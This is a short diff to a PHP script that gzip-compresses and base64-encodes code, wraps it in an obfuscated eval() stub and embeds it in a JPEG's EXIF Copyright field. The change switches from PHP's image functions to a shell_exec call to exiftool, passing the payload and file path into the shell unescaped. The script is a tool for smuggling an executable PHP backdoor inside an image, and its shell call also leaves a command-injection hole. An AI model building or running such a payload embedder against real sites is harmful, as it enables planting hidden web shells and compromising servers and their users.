@@ -7,11 +7,8 @@
     $data = gzcompress($code);
     $b64 = base64_encode($data);
     $code = "<?php eval(gzuncompress(base64_decode('$b64'))); ?>";
-    echo $code;
+    echo "$code\n";
 
-    $image = imagecreatefromjpeg($image_path);
-    $exif = exif_read_data($image_path);
-    $exif['IFD0']['Copyright'] = $code;
-    imagejpeg($image, $image_path, 100);
-    imagedestroy($image);
+    $command = "exiftool -Copyright=\"$code\" -overwrite_original $image_path";
+    shell_exec($command);
 ?>
